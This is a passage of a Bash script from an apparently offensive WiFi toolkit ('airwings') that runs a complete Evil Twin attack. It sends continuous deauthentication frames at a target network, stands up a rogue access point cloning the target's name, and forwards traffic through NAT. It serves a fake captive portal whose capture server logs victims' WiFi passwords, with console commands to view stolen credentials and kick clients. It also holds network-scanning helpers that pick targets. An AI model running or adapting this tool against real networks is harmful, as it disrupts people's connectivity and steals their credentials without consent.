        local ip_addr=$(ip addr show "$iface" 2>/dev/null | grep "inet " | awk '{print $2}' | cut -d'/' -f1 | head -1)
        local state="down"
        if ip link show "$iface" 2>/dev/null | grep -q "state UP"; then
            state="up"
        fi

        # Skip interfaces with no IP or that are down (not useful for internet)
        if [[ "$state" == "up" ]] || [[ -n "$ip_addr" ]]; then
            inet_count=$((inet_count + 1))
            inet_ifaces+=("$iface")

            local is_default=""
            if [[ "$iface" == "$default_iface" ]]; then
                is_default=" ${GREEN}(default route)${NC}"
            fi

            local iface_type="Ethernet"
            if iwconfig "$iface" 2>/dev/null | grep -q "ESSID"; then
                local connected_ssid=$(iwconfig "$iface" 2>/dev/null | grep "ESSID:" | sed 's/.*ESSID:"\(.*\)".*/\1/')
                iface_type="WiFi → $connected_ssid"
            fi

            printf "  ${CYAN}[%d]${NC} %-10s ${WHITE}%-15s${NC} %-8s IP: %-15s%b\n" \
                "$inet_count" "$iface" "$iface_type" "($state)" "${ip_addr:-none}" "$is_default"
        fi
    done
    echo -e "${GRAY}────────────────────────────────────────────────────${NC}"
    echo -e "  ${CYAN}[0]${NC} No internet (captive portal only)"
    echo ""

    local internet_iface=""
    if [[ $inet_count -eq 0 ]]; then
        echo -e "${YELLOW}[!] No interfaces with internet connectivity found${NC}"
    elif [[ $inet_count -eq 1 ]]; then
        internet_iface="${inet_ifaces[0]}"
        echo -e "${GREEN}[✓] Auto-selected: $internet_iface (only available)${NC}"
        read -p "Use $internet_iface? (Y/n): " confirm
        if [[ "$confirm" =~ ^[Nn]$ ]]; then
            internet_iface=""
        fi
    else
        read -p "Select internet interface (1-$inet_count) [0 for none]: " inet_choice
        inet_choice="${inet_choice:-0}"
        if [[ "$inet_choice" -ge 1 ]] && [[ "$inet_choice" -le $inet_count ]]; then
            internet_iface="${inet_ifaces[$((inet_choice - 1))]}"
        fi
    fi

    if [[ -n "$internet_iface" ]]; then
        # Verify the selected interface actually has an IP address
        local selected_ip=$(ip addr show "$internet_iface" 2>/dev/null | grep "inet " | awk '{print $2}' | cut -d'/' -f1 | head -1)
        if [[ -z "$selected_ip" ]]; then
            echo -e "${RED}[!] WARNING: $internet_iface has no IP address - internet forwarding will NOT work${NC}"
            echo -e "${YELLOW}[!] Make sure $internet_iface is connected to a network with DHCP${NC}"
            read -p "Continue anyway? (y/N): " continue_anyway
            if [[ ! "$continue_anyway" =~ ^[Yy]$ ]]; then
                internet_iface=""
                echo -e "${YELLOW}[!] Running captive portal only (no internet)${NC}"
            fi
        else
            echo -e "${GREEN}[✓] Internet source: $internet_iface ($selected_ip)${NC}"
        fi

        # Check if internet interface is WiFi connected to the SAME network being attacked
        if [[ -n "$internet_iface" ]]; then
            local inet_ssid=$(iwconfig "$internet_iface" 2>/dev/null | grep "ESSID:" | sed 's/.*ESSID:"\(.*\)".*/\1/')
            if [[ -n "$inet_ssid" && "$inet_ssid" == "$target_essid" ]]; then
                echo ""
                echo -e "${RED}╔══════════════════════════════════════════════════════════════╗${NC}"
                echo -e "${RED}║  WARNING: CONFLICT DETECTED                                 ║${NC}"
                echo -e "${RED}╠══════════════════════════════════════════════════════════════╣${NC}"
                echo -e "${RED}║${NC} ${WHITE}$internet_iface is connected to '$inet_ssid'${NC}"
                echo -e "${RED}║${NC} ${WHITE}You are attacking the SAME network!${NC}"
                echo -e "${RED}║${NC}"
                echo -e "${RED}║${NC} ${YELLOW}The deauth will disconnect $internet_iface, killing internet.${NC}"
                echo -e "${RED}║${NC} ${YELLOW}Use a WIRED interface (eth0) or select [0] for no internet.${NC}"
                echo -e "${RED}╚══════════════════════════════════════════════════════════════╝${NC}"
                echo ""
                read -p "Continue anyway? (y/N): " conflict_confirm
                if [[ ! "$conflict_confirm" =~ ^[Yy]$ ]]; then
                    internet_iface=""
                    echo -e "${YELLOW}[!] Running captive portal only (no internet)${NC}"
                fi
            fi
        fi
    fi

    if [[ -n "$internet_iface" ]]; then
        # Enable IP forwarding
        echo 1 > /proc/sys/net/ipv4/ip_forward
        # Also set via sysctl to ensure it sticks
        sysctl -w net.ipv4.ip_forward=1 >/dev/null 2>&1

        # Save current iptables state for restoration later
        iptables-save > "$temp_dir/iptables_backup.rules" 2>/dev/null

        # Flush ALL existing NAT and FORWARD rules to start clean
        iptables -t nat -F 2>/dev/null
        iptables -F FORWARD 2>/dev/null

        # Set FORWARD policy to ACCEPT (critical - default DROP blocks all traffic)
        iptables -P FORWARD ACCEPT

        # Set up NAT masquerade
        iptables -t nat -A POSTROUTING -o "$internet_iface" -j MASQUERADE

        # Allow forwarding between AP and internet interfaces
        iptables -A FORWARD -i "$interface" -o "$internet_iface" -j ACCEPT
        iptables -A FORWARD -i "$internet_iface" -o "$interface" -m state --state RELATED,ESTABLISHED -j ACCEPT

        # Redirect HTTP traffic from clients to captive portal (port 80)
        # This ensures captive portal detection works on all devices
        iptables -t nat -A PREROUTING -i "$interface" -p tcp --dport 80 -d 10.0.0.1 -j ACCEPT
        iptables -t nat -A PREROUTING -i "$interface" -p tcp --dport 443 -d 10.0.0.1 -j ACCEPT

        # Verify internet is reachable through the NAT
        if ping -c 1 -W 2 -I "$internet_iface" 8.8.8.8 >/dev/null 2>&1; then
            echo -e "${GREEN}[✓] Internet connectivity verified${NC}"
        else
            echo -e "${YELLOW}[!] Internet may not be reachable on $internet_iface${NC}"
        fi
        echo -e "${CYAN}[*] Victims will have full internet access${NC}"
    else
        echo -e "${YELLOW}[!] No internet interface - running captive portal only${NC}"
    fi
    sleep 1

    echo -e "${YELLOW}[*] Starting deauthentication against target...${NC}"
    aireplay-ng --deauth 0 -a "$target_bssid" "$monitor_interface" &>/dev/null &
    local deauth_pid=$!

    # Start hostapd FIRST - it needs to initialize the interface
    echo -e "${YELLOW}[*] Starting rogue AP...${NC}"
    local hostapd_log="$temp_dir/hostapd.log"
    hostapd "$temp_dir/hostapd.conf" > "$hostapd_log" 2>&1 &
    local ap_pid=$!

    # Wait for hostapd to fully initialize the interface
    sleep 5

    # Verify AP started
    if kill -0 $ap_pid 2>/dev/null; then
        echo -e "${GREEN}[✓] Rogue AP started${NC}"
    else
        echo -e "${RED}[!] AP failed to start${NC}"

        # Show error and try to recover
        if [[ -f "$hostapd_log" ]]; then
            echo -e "${RED}[!] Hostapd log:${NC}"
            tail -5 "$hostapd_log"
        fi

        # Common fix: interface needs to be fully reset
        echo -e "${YELLOW}[*] Attempting recovery...${NC}"
        ip link set "$interface" down 2>/dev/null
        sleep 2
        ip link set "$interface" up 2>/dev/null
        sleep 2

        # Retry hostapd
        hostapd "$temp_dir/hostapd.conf" > "$hostapd_log" 2>&1 &
        ap_pid=$!
        sleep 5

        if kill -0 $ap_pid 2>/dev/null; then
            echo -e "${GREEN}[✓] Rogue AP started on retry${NC}"
        else
            echo -e "${RED}[!] AP failed to start after retry${NC}"
            tail -5 "$hostapd_log" 2>/dev/null
            kill $deauth_pid 2>/dev/null
            pause
            return
        fi
    fi

    # NOW assign IP address AFTER hostapd has initialized
    ip addr flush dev "$interface" 2>/dev/null
    ip addr add 10.0.0.1/24 dev "$interface" 2>/dev/null
    sleep 1

    echo -e "${YELLOW}[*] Starting DNS server...${NC}"
    dnsmasq -C "$temp_dir/dnsmasq.conf" 2>/dev/null &
    local dns_pid=$!
    sleep 2

    # Start Python capture server (replaces lighttpd - handles credential capture)
    echo -e "${YELLOW}[*] Starting capture server...${NC}"
    local cred_log_dir="$LOGS_DIR/credentials"
    mkdir -p "$cred_log_dir"

    PORTAL_DIR="$portal_dir" \
    CRED_LOG_DIR="$cred_log_dir" \
    REDIRECT_URL="https://www.google.com" \
    BIND_ADDR="10.0.0.1" \
    BIND_PORT="80" \
    python3 "$AIRWINGS_DIR/utils/capture_server.py" &
    local web_pid=$!
    sleep 2

    # Verify capture server is running
    if kill -0 $web_pid 2>/dev/null; then
        echo -e "${GREEN}[✓] Capture server running on http://10.0.0.1${NC}"
    else
        echo -e "${RED}[!] Capture server failed to start, falling back to lighttpd${NC}"
        lighttpd -D -f "$temp_dir/lighttpd.conf" 2>/dev/null &
        web_pid=$!
    fi

    echo ""
    echo -e "${GREEN}╔══════════════════════════════════════════════════════╗${NC}"
    echo -e "${GREEN}║              EVIL TWIN ACTIVE                       ║${NC}"
    echo -e "${GREEN}╠══════════════════════════════════════════════════════╣${NC}"
    echo -e "${GREEN}║${NC} ${WHITE}AP SSID:${NC}       $target_essid"
    echo -e "${GREEN}║${NC} ${WHITE}AP Interface:${NC}  $interface"
    echo -e "${GREEN}║${NC} ${WHITE}Internet via:${NC}  ${internet_iface:-NONE (captive only)}"
    echo -e "${GREEN}║${NC} ${WHITE}Portal:${NC}        http://10.0.0.1"
    echo -e "${GREEN}║${NC} ${WHITE}Credentials:${NC}   $cred_log_dir/"
    echo -e "${GREEN}╠══════════════════════════════════════════════════════╣${NC}"
    echo -e "${GREEN}║${NC} ${CYAN}Commands:${NC}"
    echo -e "${GREEN}║${NC}   ${WHITE}clients${NC} / ${WHITE}c${NC}   - Show connected devices"
    echo -e "${GREEN}║${NC}   ${WHITE}creds${NC}   / ${WHITE}p${NC}   - Show captured passwords"
    echo -e "${GREEN}║${NC}   ${WHITE}kick${NC} <MAC>    - Disconnect a specific client"
    echo -e "${GREEN}║${NC}   ${WHITE}kickall${NC}       - Disconnect all clients"
    echo -e "${GREEN}║${NC}   ${WHITE}deauth${NC}        - Toggle deauth on/off"
    echo -e "${GREEN}║${NC}   ${WHITE}status${NC}  / ${WHITE}s${NC}   - Show attack status"
    echo -e "${GREEN}║${NC}   ${WHITE}log${NC}           - Show recent DNS/DHCP log"
    echo -e "${GREEN}║${NC}   ${WHITE}stop${NC}   / ${WHITE}q${NC}   - Stop attack and exit"
    echo -e "${GREEN}╚══════════════════════════════════════════════════════╝${NC}"
    echo ""

    # Background: monitor hostapd log for client connections (clean output)
    (
        tail -f "$hostapd_log" 2>/dev/null | while read -r line; do
            if [[ "$line" == *"AP-STA-CONNECTED"* ]]; then
                local mac=$(echo "$line" | grep -oE '([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}')
                echo -e "${GREEN}[+] Client connected: $mac${NC}"
            elif [[ "$line" == *"AP-STA-DISCONNECTED"* ]]; then
                local mac=$(echo "$line" | grep -oE '([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}')
                echo -e "${YELLOW}[-] Client disconnected: $mac${NC}"
            fi
        done
    ) &
    local monitor_pid=$!

    # Track deauth state
    local deauth_active=true

    # Interactive command loop
    while true; do
        echo ""
        read -p "$(echo -e "${CYAN}airwings>${NC} ")" cmd_input

        # Normalize command to lowercase, extract first word and args
        local cmd=$(echo "$cmd_input" | awk '{print tolower($1)}')
        local cmd_arg=$(echo "$cmd_input" | awk '{print $2}')

        case "$cmd" in
            clients|c)
                echo ""
                echo -e "${WHITE}Connected Clients:${NC}"
                echo -e "${GRAY}───────────────────────────────────────────────────────${NC}"
                printf "${CYAN}%-4s %-20s %-16s %-10s %s${NC}\n" "#" "MAC Address" "IP Address" "Hostname" "Lease Time"
                echo -e "${GRAY}───────────────────────────────────────────────────────${NC}"

                local client_count=0

                # Parse DHCP leases from dnsmasq
                if [[ -f "/var/lib/misc/dnsmasq.leases" ]]; then
                    while read -r expire mac ip hostname client_id; do
                        client_count=$((client_count + 1))
                        local remaining=""
                        if [[ "$expire" =~ ^[0-9]+$ ]]; then
                            local now=$(date +%s)
                            local left=$((expire - now))
                            if [[ $left -gt 0 ]]; then
                                remaining="$((left / 3600))h$((left % 3600 / 60))m"
                            else
                                remaining="expired"
                            fi
                        fi
                        [[ "$hostname" == "*" ]] && hostname="-"
                        printf "%-4s %-20s %-16s %-10s %s\n" "[$client_count]" "$mac" "$ip" "$hostname" "$remaining"
                    done < "/var/lib/misc/dnsmasq.leases"
                fi

                # Also check dnsmasq log for DHCPACK entries if no lease file
                if [[ $client_count -eq 0 && -f "$temp_dir/dnsmasq.log" ]]; then
                    grep "DHCPACK" "$temp_dir/dnsmasq.log" 2>/dev/null | while read -r line; do
                        local lease_ip=$(echo "$line" | grep -oE '10\.0\.0\.[0-9]+')
                        local lease_mac=$(echo "$line" | grep -oE '([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}')
                        if [[ -n "$lease_mac" ]]; then
                            client_count=$((client_count + 1))
                            printf "%-4s %-20s %-16s\n" "[$client_count]" "$lease_mac" "${lease_ip:-unknown}"
                        fi
                    done
                fi

                # Also check hostapd log for connected stations
                if [[ $client_count -eq 0 && -f "$hostapd_log" ]]; then
                    echo -e "${YELLOW}[!] No DHCP leases found. Checking hostapd...${NC}"
                    local connected_macs=$(grep "AP-STA-CONNECTED" "$hostapd_log" 2>/dev/null | grep -oE '([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}' | sort -u)
                    local disconnected_macs=$(grep "AP-STA-DISCONNECTED" "$hostapd_log" 2>/dev/null | grep -oE '([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}' | sort -u)

                    # Show MACs that connected but haven't disconnected
                    while read -r mac; do
                        [[ -z "$mac" ]] && continue
                        local disc_count=$(echo "$disconnected_macs" | grep -c "$mac" 2>/dev/null || true)
                        local conn_count=$(grep -c "AP-STA-CONNECTED.*$mac" "$hostapd_log" 2>/dev/null || true)
                        if [[ $conn_count -gt $disc_count ]]; then
                            client_count=$((client_count + 1))
                            # Try to find IP from ARP table
                            local arp_ip=$(arp -an 2>/dev/null | grep "$mac" | grep -oE '10\.0\.0\.[0-9]+' | head -1)
                            printf "%-4s %-20s %-16s\n" "[$client_count]" "$mac" "${arp_ip:-pending}"
                        fi
                    done <<< "$connected_macs"
                fi

                if [[ $client_count -eq 0 ]]; then
                    echo -e "  ${YELLOW}No clients connected${NC}"
                fi
                echo -e "${GRAY}───────────────────────────────────────────────────────${NC}"
                echo -e "  ${WHITE}Total: $client_count client(s)${NC}"
                ;;

            creds|p|passwords)
                echo ""
                echo -e "${WHITE}Captured Credentials:${NC}"
                echo -e "${GRAY}───────────────────────────────────────────────────────${NC}"

                local cred_found=false
                local latest_log=$(ls -t "$cred_log_dir"/wifi_passwords_*.txt 2>/dev/null | head -1)

                if [[ -n "$latest_log" && -f "$latest_log" ]]; then
                    local content=$(cat "$latest_log" 2>/dev/null)
                    if [[ -n "$content" && "$content" != *"="* ]] || [[ -z "$content" ]]; then
                        echo -e "  ${YELLOW}No credentials captured yet${NC}"
                    else
                        echo -e "${GREEN}"
                        cat "$latest_log"
                        echo -e "${NC}"
                        cred_found=true
                    fi
                else
                    echo -e "  ${YELLOW}No credentials captured yet${NC}"
                fi

                echo -e "${GRAY}───────────────────────────────────────────────────────${NC}"
                echo -e "  ${WHITE}Log file: ${latest_log:-none}${NC}"
                ;;

            kick)
                if [[ -z "$cmd_arg" ]]; then
                    echo -e "${YELLOW}[!] Usage: kick <MAC address>${NC}"
                    echo -e "${YELLOW}[!] Example: kick d6:19:79:cf:b3:25${NC}"
                    echo -e "${YELLOW}[!] Use 'clients' to see connected MACs${NC}"
                elif [[ "$cmd_arg" =~ ^([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}$ ]]; then
                    echo -e "${YELLOW}[*] Kicking client: $cmd_arg${NC}"
                    # Send targeted deauth using the monitor interface
                    aireplay-ng --deauth 5 -a "$target_bssid" -c "$cmd_arg" "$monitor_interface" &>/dev/null &
                    echo -e "${GREEN}[✓] Deauth sent to $cmd_arg (5 frames)${NC}"
                else
                    echo -e "${RED}[!] Invalid MAC address: $cmd_arg${NC}"
                fi
                ;;

            kickall)
                echo -e "${YELLOW}[*] Sending deauth to all connected clients...${NC}"
                aireplay-ng --deauth 5 -a "$target_bssid" "$monitor_interface" &>/dev/null &
                echo -e "${GREEN}[✓] Broadcast deauth sent (5 frames)${NC}"
                ;;

            deauth)
                if [[ "$deauth_active" == true ]]; then
                    # Stop deauth
                    kill $deauth_pid 2>/dev/null
                    deauth_active=false
                    echo -e "${YELLOW}[*] Deauth STOPPED - target clients can reconnect to original AP${NC}"
                else
                    # Restart deauth
                    aireplay-ng --deauth 0 -a "$target_bssid" "$monitor_interface" &>/dev/null &
                    deauth_pid=$!
                    deauth_active=true
                    echo -e "${GREEN}[✓] Deauth STARTED - forcing clients off target AP${NC}"
                fi
                ;;

            status|s)
                echo ""
                echo -e "${WHITE}Attack Status:${NC}"
                echo -e "${GRAY}───────────────────────────────────────────────────────${NC}"

                # AP status
                if kill -0 $ap_pid 2>/dev/null; then
                    echo -e "  Rogue AP:       ${GREEN}RUNNING${NC} (PID: $ap_pid)"
                else
                    echo -e "  Rogue AP:       ${RED}STOPPED${NC}"
                fi

                # Deauth status
                if [[ "$deauth_active" == true ]] && kill -0 $deauth_pid 2>/dev/null; then
                    echo -e "  Deauth:         ${GREEN}ACTIVE${NC} (PID: $deauth_pid)"
                else
                    echo -e "  Deauth:         ${YELLOW}INACTIVE${NC}"
                    deauth_active=false
                fi

                # DNS status
                if kill -0 $dns_pid 2>/dev/null; then
                    echo -e "  DNS/DHCP:       ${GREEN}RUNNING${NC} (PID: $dns_pid)"
                else
                    echo -e "  DNS/DHCP:       ${RED}STOPPED${NC}"
                fi

                # Web server status
                if kill -0 $web_pid 2>/dev/null; then
                    echo -e "  Capture Server: ${GREEN}RUNNING${NC} (PID: $web_pid)"
                else
                    echo -e "  Capture Server: ${RED}STOPPED${NC}"
                fi

                # Client count
                local active_clients=0
                if [[ -f "/var/lib/misc/dnsmasq.leases" ]]; then
                    active_clients=$(wc -l < "/var/lib/misc/dnsmasq.leases" 2>/dev/null || echo 0)
                fi
                echo -e "  Connected:      ${WHITE}$active_clients client(s)${NC}"

                # Credential count
                local cred_count=0
                local latest_log=$(ls -t "$cred_log_dir"/wifi_passwords_*.txt 2>/dev/null | head -1)
                if [[ -n "$latest_log" ]]; then
                    cred_count=$(grep -c "^Timestamp:" "$latest_log" 2>/dev/null || echo 0)
                fi
                echo -e "  Passwords:      ${WHITE}$cred_count captured${NC}"

                # Internet
                if [[ -n "$internet_iface" ]]; then
                    if ping -c 1 -W 1 8.8.8.8 &>/dev/null; then
                        echo -e "  Internet:       ${GREEN}ONLINE${NC} via $internet_iface"
                    else
                        echo -e "  Internet:       ${RED}OFFLINE${NC} ($internet_iface)"
                    fi
                else
                    echo -e "  Internet:       ${YELLOW}DISABLED${NC} (captive only)"
                fi

                echo -e "${GRAY}───────────────────────────────────────────────────────${NC}"
                ;;

            log)
                echo ""
                echo -e "${WHITE}Recent DNS/DHCP Log:${NC}"
                echo -e "${GRAY}───────────────────────────────────────────────────────${NC}"
                if [[ -f "$temp_dir/dnsmasq.log" ]]; then
                    tail -20 "$temp_dir/dnsmasq.log" 2>/dev/null | while read -r line; do
                        # Highlight important entries
                        if echo "$line" | grep -q "DHCPACK\|DHCPOFFER"; then
                            echo -e "  ${GREEN}$line${NC}"
                        elif echo "$line" | grep -q "query"; then
                            echo -e "  ${GRAY}$line${NC}"
                        else
                            echo -e "  $line"
                        fi
                    done
                else
                    echo -e "  ${YELLOW}No DNS log available${NC}"
                fi
                echo -e "${GRAY}───────────────────────────────────────────────────────${NC}"
                ;;

            stop|q|quit|exit)
                echo -e "${YELLOW}[*] Stopping attack...${NC}"
                break
                ;;

            "")
                # Empty input - just show prompt again
                ;;

            help|h|?)
                echo ""
                echo -e "${WHITE}Available Commands:${NC}"
                echo -e "  ${CYAN}clients${NC} / ${CYAN}c${NC}     Show connected devices with MAC, IP, hostname"
                echo -e "  ${CYAN}creds${NC}   / ${CYAN}p${NC}     Show all captured WiFi passwords"
                echo -e "  ${CYAN}kick${NC} <MAC>      Deauth a specific client (5 frames)"
                echo -e "  ${CYAN}kickall${NC}         Deauth all clients (broadcast)"
                echo -e "  ${CYAN}deauth${NC}          Toggle continuous deauth on/off"
                echo -e "  ${CYAN}status${NC}  / ${CYAN}s${NC}     Show all process statuses"
                echo -e "  ${CYAN}log${NC}             Show last 20 DNS/DHCP log entries"
                echo -e "  ${CYAN}stop${NC}    / ${CYAN}q${NC}     Stop attack and cleanup"
                ;;

            *)
                echo -e "${RED}[!] Unknown command: $cmd${NC}"
                echo -e "${YELLOW}[!] Type 'help' for available commands${NC}"
                ;;
        esac
    done

    # Kill the monitoring process
    kill $monitor_pid 2>/dev/null

    # Cleanup - kill processes in reverse order and restore interface
    echo -e "${YELLOW}[*] Stopping Evil Twin...${NC}"
    kill $web_pid $dns_pid $ap_pid $deauth_pid 2>/dev/null
    pkill -f "capture_server" 2>/dev/null
    pkill -f "dnsmasq" 2>/dev/null
    pkill -f "hostapd" 2>/dev/null
    wait $deauth_pid $dns_pid $web_pid $ap_pid 2>/dev/null

    # Restore iptables rules
    echo -e "${YELLOW}[*] Restoring network configuration...${NC}"
    if [[ -f "$temp_dir/iptables_backup.rules" ]]; then
        iptables-restore < "$temp_dir/iptables_backup.rules" 2>/dev/null
    else
        iptables -t nat -F 2>/dev/null
        iptables -F FORWARD 2>/dev/null
        iptables -P FORWARD DROP 2>/dev/null
    fi
    # Disable IP forwarding
    echo 0 > /proc/sys/net/ipv4/ip_forward 2>/dev/null

    # Restore interface
    ifconfig "$interface" down 2>/dev/null
    sleep 1
    
    # Remove virtual interface if we created it
    if [[ "$interface" == "wlan1ap" ]]; then
        iw dev "$interface" del 2>/dev/null
    fi
    
    clean_temp_dir "$temp_dir"

    success "Evil Twin attack stopped"
}

# Quick scan with numbered selection for Evil Twin
quick_scan_with_numbers() {
    local interface="$1"

    # If no interface provided, try to get one
    if [[ -z "$interface" ]]; then
        interface="${MONITOR_INTERFACE}"
    fi

    # Still empty? Try to find a monitor interface
    if [[ -z "$interface" ]]; then
        interface=$(get_monitor_interfaces | head -1)
    fi

    # Last resort: check for common naming
    if [[ -z "$interface" ]]; then
        local base=$(get_first_wireless_interface)
        if [[ -n "$base" ]] && is_monitor_mode "${base}mon"; then
            interface="${base}mon"
        fi
    fi

    if [[ -z "$interface" ]]; then
        echo -e "${RED}[!] No monitor interface found${NC}"
        echo -e "${YELLOW}[!] Please enable monitor mode first${NC}"
        return 1
    fi

    echo -e "${YELLOW}[*] Quick scanning for networks (10 seconds)...${NC}"

    # Check if interface exists
    if ! ip link show "$interface" >/dev/null 2>&1; then
        echo -e "${RED}[!] Interface $interface does not exist${NC}"
        return 1
    fi

    # Check if in monitor mode
    if ! iwconfig "$interface" 2>/dev/null | grep -q "Mode:Monitor"; then
        echo -e "${RED}[!] Interface $interface is not in monitor mode${NC}"
        echo -e "${YELLOW}[!] Current mode: $(iwconfig "$interface" 2>/dev/null | grep Mode | awk '{print $1,$2,$3,$4}' | head -1)${NC}"
        return 1
    fi

    # Kill any leftover airodump-ng processes to prevent interference
    pkill -f airodump-ng 2>/dev/null
    sleep 2

    # Clean stale scan data
    rm -f /tmp/airwings_scan.* 2>/dev/null
    rm -f /tmp/airwings_scan_data.txt 2>/dev/null

    local scan_file=$(mktemp -t airwings_scan.XXXXXX)
    timeout 12 airodump-ng --output-format csv -w "$scan_file" "$interface" &>/dev/null &
    local scan_pid=$!

    # Wait for scan with progress indicator
    for i in $(seq 1 10); do
        echo -ne "\r${YELLOW}[*] Scanning... ${i}/10s${NC}"
        sleep 1
    done
    echo ""

    kill $scan_pid 2>/dev/null
    wait $scan_pid 2>/dev/null
    sleep 1

    if [[ -f "${scan_file}-01.csv" ]]; then
        echo ""
        echo -e "${WHITE}Detected Networks:${NC}"
        echo -e "${GRAY}─────────────────────────────────────────────────────${NC}"
        printf "${CYAN}%-3s %-20s %-10s %-8s %-6s %s${NC}\n" "#" "BSSID" "Channel" "Power" "Enc" "ESSID"
        echo -e "${GRAY}─────────────────────────────────────────────────────${NC}"

        local count=0
        local network_data=""
        local header_found=false
        
        # Parse CSV file - skip first line (header), process until station section
        local line_num=0
        while IFS= read -r line; do
            line_num=$((line_num + 1))
            
            # Skip header line and empty lines
            [[ $line_num -eq 1 ]] && continue
            [[ -z "$line" ]] && continue
            
            # Stop at station section
            [[ "$line" =~ ^Station.*MAC ]] && break
            

            
            # Simple CSV parsing
            bssid=$(echo "$line" | cut -d',' -f1 | tr -d '"' | sed 's/^[[:space:]]*//;s/[[:space:]]*$//')
            first_seen=$(echo "$line" | cut -d',' -f2 | tr -d '"' | sed 's/^[[:space:]]*//;s/[[:space:]]*$//')
            last_seen=$(echo "$line" | cut -d',' -f3 | tr -d '"' | sed 's/^[[:space:]]*//;s/[[:space:]]*$//')
            channel=$(echo "$line" | cut -d',' -f4 | tr -d '"' | sed 's/^[[:space:]]*//;s/[[:space:]]*$//')
            speed=$(echo "$line" | cut -d',' -f5 | tr -d '"' | sed 's/^[[:space:]]*//;s/[[:space:]]*$//')
            privacy=$(echo "$line" | cut -d',' -f6 | tr -d '"' | sed 's/^[[:space:]]*//;s/[[:space:]]*$//')
            cipher=$(echo "$line" | cut -d',' -f7 | tr -d '"' | sed 's/^[[:space:]]*//;s/[[:space:]]*$//')
            auth=$(echo "$line" | cut -d',' -f8 | tr -d '"' | sed 's/^[[:space:]]*//;s/[[:space:]]*$//')
            power=$(echo "$line" | cut -d',' -f9 | tr -d '"' | sed 's/^[[:space:]]*//;s/[[:space:]]*$//')
            beacons=$(echo "$line" | cut -d',' -f10 | tr -d '"' | sed 's/^[[:space:]]*//;s/[[:space:]]*$//')
            iv=$(echo "$line" | cut -d',' -f11 | tr -d '"' | sed 's/^[[:space:]]*//;s/[[:space:]]*$//')
            lan_ip=$(echo "$line" | cut -d',' -f12 | tr -d '"' | sed 's/^[[:space:]]*//;s/[[:space:]]*$//')
            id_length=$(echo "$line" | cut -d',' -f13 | tr -d '"' | sed 's/^[[:space:]]*//;s/[[:space:]]*$//')
            essid=$(echo "$line" | cut -d',' -f14 | tr -d '"' | sed 's/^[[:space:]]*//;s/[[:space:]]*$//')
            key=$(echo "$line" | cut -d',' -f15 | tr -d '"' | sed 's/^[[:space:]]*//;s/[[:space:]]*$//')
            
            # If essid is empty, try last field
            if [[ -z "$essid" ]]; then
                essid=$(echo "$line" | rev | cut -d',' -f1 | rev | tr -d '"' | xargs)
            fi

            # Validate MAC address
            [[ "$bssid" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]] || continue
            
            # Skip empty ESSIDs (unless you want to show them)
            [[ -z "$essid" ]] && essid="[Hidden]"
            
            count=$((count + 1))
            printf "${CYAN}%-3s${NC} %-20s %-10s %-8s %-6s %s\n" "[$count]" "$bssid" "$channel" "${power}dBm" "$privacy" "$essid"
            
            # Store network info for later retrieval (format: "BSSID|Channel|ESSID")
            network_data+="${bssid}|${channel}|${essid}"$'\n'
        done < "${scan_file}-01.csv"

        rm -f "${scan_file}"*.csv "${scan_file}"*.kismet* 2>/dev/null
        
        # If no networks found, show message
        if [[ $count -eq 0 ]]; then
            echo -e "${YELLOW}No networks detected. Try increasing scan time or check adapter.${NC}"
            network_data=""
        fi
        
        # Save network data to fixed temp file for caller to use
        echo "$network_data" > "/tmp/airwings_scan_data.txt"
    else
        echo -e "${RED}[!] Scan failed - no data collected${NC}"
        echo -e "${YELLOW}[!] Check if adapter is in monitor mode${NC}"
        # Clear any existing scan data
        rm -f "/tmp/airwings_scan_data.txt"
    fi
}

# Quick scan helper for target selection
quick_scan() {
    local interface="$1"

    # If no interface provided, try to get one
    if [[ -z "$interface" ]]; then
        interface="${MONITOR_INTERFACE}"
    fi

    # Still empty? Try to find a monitor interface
    if [[ -z "$interface" ]]; then
        interface=$(get_monitor_interfaces | head -1)
    fi

    # Last resort: check for common naming
    if [[ -z "$interface" ]]; then
        local base=$(get_first_wireless_interface)
        if [[ -n "$base" ]] && is_monitor_mode "${base}mon"; then
            interface="${base}mon"
        fi
    fi

    if [[ -z "$interface" ]]; then
        echo -e "${RED}[!] No monitor interface found${NC}"
        echo -e "${YELLOW}[!] Please enable monitor mode first${NC}"
        return 1
    fi

    echo -e "${YELLOW}[*] Quick scanning for networks (10 seconds)...${NC}"

    # Kill any existing airodump-ng processes to prevent hanging
    pkill -f airodump-ng 2>/dev/null
    sleep 1

    local scan_file=$(mktemp -t airwings_scan.XXXXXX)
    timeout 10 airodump-ng --output-format csv -w "$scan_file" "$interface" 2>/dev/null &
    local scan_pid=$!

    sleep 10
    kill $scan_pid 2>/dev/null
    wait $scan_pid 2>/dev/null

    if [[ -f "${scan_file}-01.csv" ]]; then
        echo ""
        echo -e "${WHITE}Detected Networks:${NC}"
        echo -e "${GRAY}─────────────────────────────────────────────────────${NC}"
        printf "${CYAN}%-20s %-10s %-8s %-6s %s${NC}\n" "BSSID" "Channel" "Power" "Enc" "ESSID"
        echo -e "${GRAY}─────────────────────────────────────────────────────${NC}"

        while IFS=',' read -r bssid first_seen last_seen channel speed privacy cipher auth power beacons iv lan_ip id_len essid key; do
            bssid=$(echo "$bssid" | xargs)
            channel=$(echo "$channel" | xargs)
            power=$(echo "$power" | xargs)
            privacy=$(echo "$privacy" | xargs)
            essid=$(echo "$essid" | xargs)

            [[ "$bssid" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]] || continue
            printf "%-20s %-10s %-8s %-6s %s\n" "$bssid" "$channel" "${power}dBm" "$privacy" "$essid"
        done < "${scan_file}-01.csv"

        rm -f "${scan_file}"*.csv "${scan_file}"*.kismet* 2>/dev/null
    fi
}

# ===== Helper constants and utility functions =====

# Colors
RED="\e[31m"
GREEN="\e[32m"
YELLOW="\e[33m"
BLUE="\e[34m"
CYAN="\e[36m"
WHITE="\e[97m"
GRAY="\e[90m"
NC="\e[0m"

# Default directories
LOGS_DIR="${LOGS_DIR:-$PWD/logs}"
mkdir -p "$LOGS_DIR/captures" "$LOGS_DIR/credentials" 2>/dev/null || true

get_timestamp() {
    date +%Y%m%d%H%M%S
}

get_file_size() {
    local f="$1"
    [[ -f "$f" ]] || { echo "0B"; return; }
